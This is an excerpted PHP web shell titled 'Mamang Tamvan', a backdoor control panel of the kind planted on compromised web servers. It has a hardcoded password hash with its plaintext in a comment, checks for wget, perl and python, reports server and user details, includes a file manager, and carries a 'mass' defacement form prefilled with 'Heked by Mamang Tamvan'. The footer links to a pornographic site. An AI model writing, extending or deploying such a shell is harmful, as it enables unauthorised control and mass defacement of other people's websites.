...
$password = "f6abb0416172664965b97582432c5f30"; # md5: aingmacan
...
<!--
###############################################################################
awkowkowkowkowkwokwowkowkwokwowkowkowkwowkowkwokwowkowkwokwowkowkwokwowkowkwokw
###############################################################################
awkowkowkwokwokwowkwokwowkowkwokwowkowkwokwokwowkowkowkwokwowkowkwokwowkowkowkw
###############################################################################
-->
<head>
<title>Mamang Tamvan</title>
<meta name='author' content='Hayuk..?'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Fantasy);
html {
    background: #2F4F4F;
	color: #006400;
	font-size: 16px;
...
function color($bold = 1, $colorid = null, $string = null) {
		$color = array(
			"</font>",  			# 0 off
			"<font color='white'>",	# 1 white 
			"<font color='white'>",	# 2 white
			"<font color='white'>",	# 3 white
			"<font color='white'>",	# 4 white
		);
...
function lib_installed() {
	$lib[] = "MySQL: ".(function_exists('mysql_connect') ? color(2, 2, "ON") : color(2, 2, "OFF"));
	$lib[] = "cURL: ".(function_exists('curl_version') ? color(2, 2, "ON") : color(2, 2, "OFF"));
	$lib[] = "WGET: ".(exe('wget --help') ? color(2, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "Perl: ".(exe('perl --help') ? color(2, 2, "ON") : color(2, 1, "OFF"));
	$lib[] = "Python: ".(exe('python --help') ? color(2, 2, "ON") : color(2, 2, "OFF"));
	return implode(" | ", $lib);
}
...
function serverinfo() {
	...
	$output[] = "SERVER IP ".color(2, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(2, 2, $_SERVER['REMOTE_ADDR']);
	$output[] = "WEB SERVER  : ".color(2, 2, $_SERVER['SERVER_SOFTWARE']);
	$output[] = "SYSTEM      : ".color(2, 2, php_uname());
	$output[] = "USER / GROUP: ".color(2, 2, usergroup()->name)."(".color(2, 2 , usergroup()->uid).") / ".color(2, 2 , usergroup()->group)."(".color(2, 2 , usergroup()->gid).")";
	$output[] = "HDD         : ".color(2, 2, hdd()->used)." / ".color(2, 2 , hdd()->size)." (Free: ".color(2, 2 , hdd()->free).")";
	$output[] = "PHP VERSION : ".color(2, 2, @phpversion());
	$output[] = "SAFE MODE   : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(2, 2, "ON") : color(2, 2, "OFF"));
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='xnxx.com' target='_blank'>".color(1, 2, "Mamang Tamvan")."</a></center>";
}
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Heked by Mamang Tamvan</textarea><br>
